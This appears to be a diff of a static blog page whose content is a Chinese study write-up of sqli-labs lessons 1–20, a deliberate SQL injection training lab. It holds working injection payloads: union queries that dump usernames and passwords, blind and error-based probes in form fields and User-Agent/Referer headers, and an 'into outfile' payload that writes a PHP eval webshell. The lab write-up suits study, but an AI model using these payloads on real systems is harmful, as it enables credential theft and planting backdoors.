@@ -8,8 +8,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="http://localhost:4000/favicon.ico?v=1649940180241">
-<link rel="stylesheet" href="http://localhost:4000/styles/main.css">
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1649942382590">
+<link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
 
 
 
@@ -33,8 +33,8 @@ mysql查询语句
       <div class="sidebar" :class="{ 'full-height': menuVisible }">
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
-      <a class="site-title-container" href="http://localhost:4000">
-        <img src="http://localhost:4000/images/avatar.png?v=1649940180241" class="site-logo">
+      <a class="site-title-container" href="https://z0ekball.github.io">
+        <img src="https://z0ekball.github.io/images/avatar.png?v=1649942382590" class="site-logo">
         <h1 class="site-title">z0ekball</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -87,7 +87,7 @@ mysql查询语句
       温故而知新
     </div>
     <div class="site-footer">
-      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="http://localhost:4000/atom.xml" target="_blank">RSS</a>
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://z0ekball.github.io/atom.xml" target="_blank">RSS</a>
     </div>
   </div>
 </div>
@@ -99,7 +99,7 @@ mysql查询语句
             <h2 class="post-title">sqli-labs学习1~20</h2>
             <div class="post-date">2021-06-05</div>
             
-              <div class="feature-container" style="background-image: url('http://localhost:4000/post-images/sql-zhu-ru-ji-chu-zhi-shi.webp')">
+              <div class="feature-container" style="background-image: url('https://z0ekball.github.io/post-images/sql-zhu-ru-ji-chu-zhi-shi.webp')">
               </div>
             
             <div class="post-content" v-pre>
@@ -141,13 +141,13 @@ id=-1' union select 1,2,group_concat(table_name) from information_schema. tables
 
 id=-1' union select 1,2,group_concat(column_name) from information_schema. columns where table_name=0x()--+
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1623248765124.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1623248765124.png" alt="" loading="lazy"></figure>
 <h3 id="连接查询用户名和密码所有用户和密码">连接查询用户名和密码/所有用户和密码</h3>
 <pre><code class="language-sql">id=-1'  union select 1,2,concat_ws('~',username,password)from security.users limit 1,1--+
 
 id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1623248880427.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
 <h1 id="less-2">less-2</h1>
 <p>注入漏洞：id=1--+,不需要'</p>
 <h1 id="less-3">less-3</h1>
@@ -181,8 +181,8 @@ ascii(substr((select database()),1,1)2分法获得字符
 <h3 id="示例">示例</h3>
 <pre><code class="language-sql">burpsuite:  id=1' and left((select database()),1))='a'--+
 </code></pre>
-<p><img src="http://localhost:4000/post-images/1623250110147.png" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1623250114161.png" alt="" loading="lazy"></p>
+<p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
 <h1 id="less-6">less-6</h1>
 <p>注入漏洞：id=1”--+,布尔型盲注</p>
 <h1 id="less-7一句话木马">less-7（一句话木马）</h1>
@@ -200,8 +200,8 @@ ascii(substr((select database()),1,1)2分法获得字符
 <h3 id="示例-2">示例</h3>
 <pre><code class="language-sql">id=1')) union select 1,2,'&lt;?php @eval($_POST[''pass'']);?&gt;' into outfile 'D:\\learning_tools\\phpstudy\\phpstudy_pro\\WWW\\sqli\\Less-7\\test2.php' --+
 </code></pre>
-<p><img src="http://localhost:4000/post-images/1623251647771.png" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1623251657358.png" alt="" loading="lazy"></p>
+<p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
 <h1 id="less-8">less-8</h1>
 <p>注入漏洞：id=1'--+,布尔盲注</p>
 <h1 id="less-9时间盲注">less-9（时间盲注）</h1>
@@ -232,7 +232,7 @@ uname=n' union select 1,group_concat(username) from security.users  #&amp;passwd
 //查询用户~密码
 uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users  #&amp;passwd=admin&amp;submit=Submit
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="http://localhost:4000/post-images/1623253088112.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
 <h1 id="less-12">less-12</h1>
 <p>注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
 <h1 id="less-13-布尔盲注">less-13 (布尔盲注)</h1>
@@ -242,7 +242,7 @@ uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from sec
 <pre><code class="language-sql">burp suite爆破：
 uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="http://localhost:4000/post-images/1623253489685.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
 <h1 id="less-14">less-14</h1>
 <p>注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit<br>
 布尔型盲注</p>
@@ -267,7 +267,7 @@ uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
 <pre><code class="language-sql">//返回当前数据库
 uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &amp;submit=Submit
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="http://localhost:4000/post-images/1623254628297.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
 <h1 id="less-18user-agent漏洞">less-18（User-Agent漏洞）</h1>
 <p>注入漏洞：<br>
 User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1<br>
@@ -278,7 +278,7 @@ User-Agent:'or updatexml(1,concat('~',(database())),1), '','')#<br>
 <pre><code>//查库
 User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="http://localhost:4000/post-images/1623256440472.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
 <h1 id="less-19referer漏洞">less-19（Referer漏洞）</h1>
 <p>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1<br>
 注入点在referer,其他一样</p>
@@ -289,7 +289,7 @@ User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
             
               <div class="tag-container">
                 
-                  <a href="http://localhost:4000/tag/Xnf6eEgg-/" class="tag">
+                  <a href="https://z0ekball.github.io/tag/Xnf6eEgg-/" class="tag">
                     sql注入
                   </a>
                 
@@ -298,7 +298,7 @@ User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="http://localhost:4000/post/a-sa-da-d/">
+                <a href="https://z0ekball.github.io/post/a-sa-da-d/">
                   <h3 class="post-title">
                     关于zyy是只猪这件事
                   </h3>
